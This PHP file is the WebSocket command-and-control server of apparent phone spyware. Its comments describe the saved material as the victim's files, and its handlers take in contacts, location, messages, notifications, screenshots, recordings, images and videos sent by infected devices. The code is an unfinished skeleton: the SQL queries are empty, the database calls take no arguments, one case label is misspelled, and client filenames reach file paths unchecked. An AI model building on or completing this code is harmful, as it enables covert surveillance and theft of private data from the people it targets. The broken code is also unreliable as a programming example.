<?php

namespace C2;

use Ratchet\ConnectionInterface;
use Ratchet\RFC6455\Messaging\MessageInterface;
use Ratchet\WebSocket\MessageComponentInterface;

class C2WebSocket implements MessageComponentInterface {

    protected $clients;

    /** @var string $fileUploadPath Directory for saving victim's files */
    private string $fileUploadPath = __DIR__ . '/../../files/';

    /** @var Database $database Database instance */
    private Database $database;

    public function __construct(Database $database)
    {
        $this->clients = new \SplObjectStorage();
        $this->database = $database;
    }

    public function onOpen(ConnectionInterface $conn)
    {
        $this->clients->attach($conn);
    }

    public function onMessage(ConnectionInterface $conn, MessageInterface $msg)
    {
        $data = json_decode($msg->getContents());

        if ($data['type'] === 'client') {
            switch ($data['res']) {
                case "contact":
                    $query = "INSERT INTO CONTACT() VALUES()";
                    $this->database->insert();
                    break;
                case "image":
                    $query = "INSERT INTO IMAGE() VALUES()";
                    $this->database->insert();
                    $this->writeFile($data['content'], $data['filename'], 'images');
                    break;
                case "location":
                    $query = "INSERT INTO LOCATION() VALUES()";
                    $this->database->insert();
                    break;
                case "message":
                    $query = "INSERT INTO MESSAGE() VALUES()";
                    $this->database->insert();
                    break;
                case "notification":
                    $query = "INSERT INTO NOTIFICATION() VALUES()";
                    $this->database->insert();
                    break;
                case "recording":
                    $query = "INSERT INTO RECORDING() VALUES()";
                    $this->database->insert();
                    $this->writeFile($data['content'], $data['filename'], 'recordings');
                    break;
                case "screesnshot":
                    $query = "INSERT INTO SCREENSHOT() VALUES()";
                    $this->database->insert();
                    $this->writeFile($data['content'], $data['filename'], 'screenshots');
                    break;
                case "video":
                    $query = "INSERT INTO VIDEO() VALUES()";
                    $this->database->insert();
                    $this->writeFile($data['content'], $data['filename'], 'videos');
                    break;
                default:
                    break;
            }
        }

        if ($data['type'] === 'server') {

        }
    }

    public function onClose(ConnectionInterface $conn)
    {
        $this->clients->detach($conn);
    }

    public function onError(ConnectionInterface $conn, \Exception $e)
    {
        $conn->close();
    }

    /**
     * Write contents to a file
     * 
     * @param string $content
     * @param string $filename
     */
    private function writeFile(string $content, string $filename, string $type): void
    {
        // Use FILE_APPEND flag to append content if the file exists
        // Use LOCK_EX flag to acquire an exclusive lock on the file
        $path = $this->fileUploadPath . $type . '/' . $filename;
        file_put_contents($path, base64_decode($content), FILE_APPEND | LOCK_EX);
    }
}